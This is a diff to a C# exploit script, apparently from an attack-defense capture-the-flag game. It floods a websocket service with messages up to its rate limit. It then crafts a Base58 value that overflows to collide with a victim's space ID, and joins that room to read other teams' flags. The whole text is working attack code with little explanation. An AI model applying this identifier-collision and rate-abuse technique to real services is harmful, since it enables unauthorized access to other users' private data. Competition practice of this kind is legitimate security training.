@@ -18,13 +18,14 @@ JsonSerializerOptions jsonOptions = new()
 
 var cts = new CancellationTokenSource();
 
+var hostAndPort = args[0];
 bool useSavedState = false;
 var cookies = new CookieContainer();
 await using var stateStream = new FileStream("cookie.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read);
 if(stateStream.Length > 0)
 {
     using var reader = new StreamReader(stateStream);
-    cookies.Add(new Cookie("usr", await reader.ReadToEndAsync(), null, args[0]));
+    cookies.Add(new Cookie("usr", await reader.ReadToEndAsync(), null, hostAndPort.Split(':')[0]));
     useSavedState = true;
 }
 
@@ -49,10 +50,10 @@ using var hc = new HttpClient(new SocketsHttpHandler
 });
 
 var ws1 = new ClientWebSocket();
-await ws1.ConnectAsync(new Uri($"ws://{args[0]}/ws"), hc, CancellationToken.None);
+await ws1.ConnectAsync(new Uri($"ws://{hostAndPort}/ws"), hc, CancellationToken.None);
 
 var cookie = cookies.GetAllCookies().FirstOrDefault(c => c.Name == "usr")?.Value;
-Console.WriteLine("Cookie: " + cookie);
+await Console.Error.WriteLineAsync("Cookie: " + cookie);
 
 var flagRegex = new Regex(@"^TEAM\d{1,3}_[A-Z0-9]{32}$", RegexOptions.Compiled | RegexOptions.CultureInvariant);
 
@@ -64,10 +65,10 @@ if(!useSavedState)
     await Task.Delay(1000);
     try
     {
-        var msg = JsonSerializer.SerializeToUtf8Bytes(new Command { Type = MsgType.Generate }, jsonOptions);
+        var msg = JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Generate, null), jsonOptions);
         for(int k = 0; k < 10; k++)
         {
-            for(int i = 0; i <= 595; i++)
+            for(int i = 0; i <= 595; i++) // Use the number of iterations close to limit per minute
             {
                 await ws1.SendAsync(msg, WebSocketMessageType.Text, true, cts.Token);
                 if(i % 100 == 0) await Console.Error.WriteLineAsync($"send {i} msgs");
@@ -85,7 +86,7 @@ if(!useSavedState)
     }
 
     await Task.Delay(1000);
-    await ws1.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command { Type = MsgType.Join }, jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
+    await ws1.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Join, null), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
 
     await using var writer = new StreamWriter(stateStream);
     writer.Write(cookie);
@@ -94,34 +95,37 @@ if(!useSavedState)
 await Task.Delay(1000);
 
 var context = args[1];
-var pwn = FindOverflowedEqualValue(context.Split('/')[0]);
-await Console.Error.WriteLineAsync(pwn);
+var spaceIdToPwn = context.Split('/')[0];
+var pwn = FindOverflowedEqualValue(spaceIdToPwn);
+await Console.Error.WriteLineAsync("" + pwn);
 
-await ws1.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command {Type = MsgType.Room, Data = pwn}, jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
+await ws1.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Room, pwn), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
 await Task.Delay(1000);
 await Console.Error.WriteLineAsync("===== SECOND WS CONNECTION =====");
 
 var ws2 = new ClientWebSocket();
-await ws2.ConnectAsync(new Uri($"ws://{args[0]}/ws"), CancellationToken.None);
+await ws2.ConnectAsync(new Uri($"ws://{hostAndPort}/ws"), CancellationToken.None);
 
 CreateRecvThread(ws2).Start();
 
-await ws2.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command {Type = MsgType.Join, Data = pwn}, jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
+await ws2.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Join, pwn), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
 if(context.Contains('/'))
 {
     await Task.Delay(1000);
-    await ws2.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command { Type = MsgType.Room, Data =  context.Split('/').Last() }, jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
+    var room = context.Split('/').Last();
+    await ws2.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Room, room), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
 }
 
 await Task.Delay(3000);
 
-string FindOverflowedEqualValue(string example)
+string FindOverflowedEqualValue(string spaceIdToPwn)
 {
-    if(!Base58.TryDecodeUInt64(example, out var value))
+    if(!Base58.TryDecodeUInt64(spaceIdToPwn, out var value))
         throw new Exception("Invalid input");
 
     var x = new BigInteger(value);
 
+    // Start finding Base58 string which decodes to the same Int64 from some random point greater than long.MaxValue
     Base58.TryDecodeBigInt("33333333333333333", out var from);
     for(int i = 0; i < 10005000; i++)
     {
@@ -130,7 +134,6 @@ string FindOverflowedEqualValue(string example)
         if(!result.All(char.IsAsciiLetterLower))
             continue;
 
-        Console.WriteLine(i + " " + result);
         if(!Base58.TryDecodeUInt64(result, out var check) || check != value)
             throw new Exception("Auto check failed");
 
@@ -140,6 +143,7 @@ string FindOverflowedEqualValue(string example)
     throw new Exception("Attempts limit exceeded");
 }
 
+// Processing received messages
 Thread CreateRecvThread(WebSocket ws) => new(async () =>
 {
     var buffer = new byte[4096];
@@ -181,21 +185,8 @@ Thread CreateRecvThread(WebSocket ws) => new(async () =>
     }
 });
 
-public class Command
-{
-    public MsgType Type { get; set; }
-    public string Data { get; set; }
-}
-
-internal class Message
-{
-    public MsgType Type { get; set; }
-    public string? Context { get; set; }
-    public string? Author { get; set; }
-    public string? Avatar { get; set; }
-    public string? Text { get; set; }
-    public DateTime Time { get; set; }
-}
+record Command(MsgType Type, string? Data);
+record Message(MsgType Type, string? Context, string? Author, string? Avatar, string? Text, DateTime Time);
 
 public enum MsgType
 {
